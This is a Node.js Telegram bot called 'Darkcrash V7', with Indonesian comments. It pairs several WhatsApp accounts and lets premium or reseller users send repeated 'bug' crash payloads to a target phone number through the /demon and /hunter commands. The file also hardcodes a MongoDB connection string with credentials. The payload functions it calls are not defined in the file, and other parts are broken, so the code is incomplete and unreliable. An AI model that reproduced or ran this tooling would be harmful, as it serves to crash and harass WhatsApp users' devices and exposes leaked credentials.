/*
sumber no enc 😝 t.me/YDqrsc
contact t.me/Dqrsc
minimal jangan hapus deck

error ? entod aja🗿
*/

const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  generateWAMessageFromContent,
  vGenerateWAMessageFromContent13,
  downloadContentFromMessage,
  makeInMemoryStore,
  areJidsSameUser,
  getContentType,
  decryptPollVote,
  relayMessage,
  Browsers,
  jidDecode,
  proto,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const axios = require("axios");
const path = require("path");
const cooldowns = new Map();
const COOLDOWN_TIME = 80 * 1000; // 60 detik
const COOLDOWN_FILE = path.join(__dirname, "database", "cooldown.json");
let globalCooldown = 0;
const crypto = require("crypto");
const { BOT_TOKEN, OWNER_ID } = require("./config");
const chalk = require("chalk");
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const mongoose = require("mongoose");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const tokenSchema = new mongoose.Schema({
  token: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
});

const Token = mongoose.model("Token", tokenSchema, "tokens");

async function getBuffer(url) {
  try {
    const res = await axios.get(url, { responseType: "arraybuffer" });
    return res.data;
  } catch (error) {
    console.error(error);
    throw new Error("Gagal mengambil data.");
  }
}

const sessions = new Map();

const verifyToken = async (token) => {
  try {
    const tokenExists = await Token.findOne({ token });
    return !!tokenExists;
  } catch (error) {
    console.error("Error verifying token");
    return false;
  }
};
/*
sumber no enc 😝 t.me/YDqrsc
contact t.me/Dqrsc
minimal jangan hapus deck

error ? entod aja🗿
*/

async function connectToMongoDB () {
  try {
    await mongoose.connect(
      "mongodb+srv://darkcrash:darkcrasher@cluster0.ilu3u.mongodb.net/",
      {
        useNewUrlParser: true,
        useUnifiedTopology: true,
      }
    );
    console.log(chalk.green("✅ MongoDB Terhubung!"));
  } catch (error) {
    console.error(
      chalk.red(
        "❌ MAAF SCRIPT INI TELAH DI ERRORKAN OLEH DEV, MUNGKIN ADA YANG MENYEBAR / PENYUSUP, TUNGGU BEBERAPA SAAT SCRIPT INI AKAN DI PULIHKAN DENGAN DATABASE YANG BERBEDA"
      )
    );
    
  }
};

connectToMongoDB()

// runtime panel
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

//setcd
function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)(s|m)$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  const value = parseInt(amount);

  switch (unit) {
    case "s":
      return value;
    case "m":
      return value * 60;
    default:
      return null;
  }
}

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `Inisialisasi...`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `Mencoba menghubungkan...`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `Tidak Dapat Terhubung`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `WhatsApp Berhasil terhubung!`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber.replace(/[^\d]/g, ''), global.pairingCode);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `Error +_+`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}
/*
sumber no enc 😝 t.me/YDqrsc
contact t.me/Dqrsc
minimal jangan hapus deck

error ? entod aja🗿
*/
async function initializeBot() {
  const isValidToken = await checkAccess(BOT_TOKEN);
  if (!isValidToken) {
    console.log(chalk.bold.red("Token tidak terdaftar dalam database!"));
  }
  console.log(`
Darkcrash V7 Active`);

await initializeWhatsAppConnections();
  }
  
initializeBot();

// [ BUG FUNCTION ]

// Fungsi untuk mengecek apakah user premium 
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function isSupervip(userId) {
  return supervipUsers.includes(userId.toString());
}

function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

const premiumFile = path.resolve("./premium.js");
let premiumUsers = require("./premium.js");

const supervipFile = path.resolve("./reseller.js");
let supervipUsers = require("./reseller.js");

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(
      chatId, `
┏━━━━━━━━━━━━━━━━━━━━
┃ 「 ⚠️ INFORMATION 」
┃ ► Ketik /menu untuk melihat
┃ ► daftar command yang tersedia
┗━━━━━━━━━━━━━━━━━━━━
`,
  );
});

bot.onText(/\/menu/, (msg) => {
  const chatId = msg.chat.id;
  // Runtime Panel
  const getrunpanel = getUptime();
  
  bot.sendVideo(chatId, "https://files.catbox.moe/3xs7u6.mp4", {
    caption: `
┏━━━━「 𝕯𝖆𝖗𝖐𝖈𝖗𝖆𝖘𝖍 𝖁7 」━━━━━
┃  ╭─────────────────
┃  │► Developer : 𝘿𝙖𝙧𝙠𝙣𝙚𝙨𝙨              
┃  │► Version : 7.0
┃  │► Online : ${getrunpanel}
┃  │► Total Bot :  ${sessions.size}
┃  ╰─────────────────
┃  ╭─────────────────
┃  │► /demon <delay force>
┃  │► /hunter <crash beta>
┃  ╰─────────────────
┃  ╭─────────────────
┃  │► /controlmenu <all menu>
┃  ╰─────────────────
┗━━━━━━━━━━━━━━━━━━━━━━
`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "「 𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖊𝖗 」", url: "https://t.me/DARKNESSREALS" }],
        [{ text: "「 𝕮𝖍𝖆𝖓𝖓𝖊𝖑 」", url: "https://t.me/channeldarkness" }],
      ],
    },
  });
});

bot.onText(/\/controlmenu/, (msg) => {
  const chatId = msg.chat.id;
  
  bot.sendVideo(chatId, "https://files.catbox.moe/3xs7u6.mp4", {
    caption: `
┏━━━━「 𝕯𝖆𝖗𝖐𝖈𝖗𝖆𝖘𝖍 𝖁7 」━━━━━
┃  ╭─────────────────
┃  │► /addbot <628xxx>
┃  │► /listbot <total bot>
┃  │► /setcd <duration>
┃  │► /statuscd <status>
┃  │► /addprem <id>
┃  │► /addreseller <id>
┃  │► /delprem <id>
┃  │► /delreseller <id>
┃  │► /listprem <list premium> 
┃  │► /cekprem <status> 
┃  ╰─────────────────
┗━━━━━━━━━━━━━━━━━━━━━━
`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "「 𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖊𝖗 」", url: "https://t.me/DARKNESSREALS" }],
        [{ text: "「 𝕮𝖍𝖆𝖓𝖓𝖊𝖑 」", url: "https://t.me/channeldarkness" }],
      ],
    },
  });
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});

bot.onText(/\/setcd(.*)/, async (msg, match) => {
const chatId = msg.chat.id;
  const duration = match[1].trim();


  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menambah pengguna owner",
      { parse_mode: "Markdown" }
    );
  }

  if (!duration) {
    return bot.sendMessage(
      chatId,
      "┏━━━━━━━━━━━━━\n┃ /setcd <durasi>\n┃ Contoh: /setcd 60s atau /setcd 10m\n┃ (s=detik, m=menit)\n┗━━━━━━━━━━━━━",
      { parse_mode: "Markdown" }
    );
  }
/*
sumber no enc 😝 t.me/YDqrsc
contact t.me/Dqrsc
minimal jangan hapus deck

error ? entod aja🗿
*/
  const seconds = parseCooldownDuration(duration);

  if (seconds === null) {
    return bot.sendMessage(
      chatId,
      "┏━━━━━━━━━━━━━\n┃ /setcd <durasi>\n┃ Contoh: /setcd 60s atau /setcd 10m\n┃ (s=detik, m=menit)\n┗━━━━━━━━━━━━━",
      { parse_mode: "Markdown" }
    );
  }

  const cooldownData = loadCooldownData();
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime =
    seconds >= 60 ? `${Math.floor(seconds / 60)} menit` : `${seconds} detik`;

  await bot.sendMessage(
    chatId,
    `┏━━━━━━━━━━━━━\n┃ Cooldown telah diatur ke ${displayTime}\n┗━━━━━━━━━━━━━`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/statuscd/, async (msg) => {
  const chatId = msg.chat.id;


  if (!isOnGlobalCooldown()) {
    return bot.sendMessage(
      chatId,
      "┏━━━━━━━━━━━━━\n┃ Tidak ada cooldown aktif\n┗━━━━━━━━━━━━━",
      { parse_mode: "Markdown" }
    );
  }

  const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
  await bot.sendMessage(
    chatId,
    `┏━━━━━━━━━━━━━\n┃ Sisa waktu: ${remainingTime}\n┗━━━━━━━━━━━━━`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/addreseller (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menambah pengguna reseller",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "⚠️ Mohon masukkan ID pengguna yang valid.");
  }

  if (supervipUsers.includes(newUserId)) {
    return bot.sendMessage(
      chatId,
      "Pengguna sudah terdaftar sebagai reseller"
    );
  }
/*
sumber no enc 😝 t.me/YDqrsc
contact t.me/Dqrsc
minimal jangan hapus deck

error ? entod aja🗿
*/
  supervipUsers.push(newUserId);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar reseller"
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar reseller`
    );
  });
});

bot.onText(/\/delreseller (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menghapus pengguna reseller",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!supervipUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "Pengguna tidak ditemukan dalam daftar reseller"
    );
  }

  supervipUsers = supervipUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar reseller"
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar reseller`
    );
  });
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat melihat daftar pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }
/*
sumber no enc 😝 t.me/YDqrsc
contact t.me/Dqrsc
minimal jangan hapus deck

error ? entod aja🗿
*/
  const premiumList = premiumUsers
    .map((id, index) => `${index + 1}. ${id}`)
    .join("\n");

  bot.sendMessage(
    chatId,
    `Daftar Pengguna Premium:\n${premiumList || "Tidak ada pengguna premium."}`,
    { parse_mode: "Markdown" }
  );
});
bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;

  if (!isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Anda bukan user prem*\nSilakan upgrade ke premium.",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "Selamat! Anda memiliki akses ke fitur premium.");
});

bot.onText(/\/addprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menambah pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "⚠️ Mohon masukkan ID pengguna yang valid.");
  }

  if (premiumUsers.includes(newUserId)) {
    return bot.sendMessage(chatId, "Pengguna sudah terdaftar sebagai premium.");
  }

  premiumUsers.push(newUserId);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium.`
    );
  });
});

bot.onText(/\/delprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menghapus pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!premiumUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "Pengguna tidak ditemukan dalam daftar premium."
    );
  }

  premiumUsers = premiumUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar premium."
      );
    }
/*
sumber no enc 😝 t.me/YDqrsc
contact t.me/Dqrsc
minimal jangan hapus deck

error ? entod aja🗿
*/
    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList =
      "╭─────────────────\n│    *DAFTAR BOT*    \n│────────────────\n";
    let index = 1;

    for (const [botNumber, sock] of sessions.entries()) {
      const status = sock.user ? "Terhubung" : "Tidak Terhubung";
      botList += `│ ${index}. ${botNumber}\n│    Status: ${status}\n│\n`;
      index++;
    }

    botList += `│ Total Bot : ${sessions.size} bot\n╰─────────────────`;

    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/demon (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;


    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }
    
    if (!isOwner(msg.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return bot.sendMessage(
      chatId,
      `┏━━━━━━━━━━━━━\n┃ Tunggu ${remainingTime} lagi\n┗━━━━━━━━━━━━━`,
      { parse_mode: "Markdown" }
    );
  }
  
    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Proses mengirim bug ke ${formattedNumber} menggunakan ${sessions.size} bot`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }
        
        for (let i = 0; i < 50; i++) {
        await Bijilu(sock, jid);
        await Bapaklu(sock, jid);
  }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `Sukses mengirim bug ke ${formattedNumber} menggunakan ${sessions.size} bot`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
    /*
sumber no enc 😝 t.me/YDqrsc
contact t.me/Dqrsc
minimal jangan hapus deck

error ? entod aja🗿
*/
    if (!isOwner(msg.from.id)) {
    setGlobalCooldown();
  }
});

bot.onText(/\/hunter (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;


    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }
    
    if (!isOwner(msg.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return bot.sendMessage(
      chatId,
      `┏━━━━━━━━━━━━━\n┃ Tunggu ${remainingTime} lagi\n┗━━━━━━━━━━━━━`,
      { parse_mode: "Markdown" }
    );
  }
  
    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Proses mengirim bug ke ${formattedNumber} menggunakan ${sessions.size} bot`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }
        
        for (let i = 0; i < 80; i++) {
        await Maklu(sock, jid);
        await Maklu(sock, jid);
  }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `Sukses mengirim bug ke ${formattedNumber} menggunakan ${sessions.size} bot`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
    
    if (!isOwner(msg.from.id)) {
    setGlobalCooldown();
  }
});

console.log("Bot telah dimulai...");
/*
sumber no enc 😝 t.me/YDqrsc
contact t.me/Dqrsc
minimal jangan hapus deck

error ? entod aja🗿
*/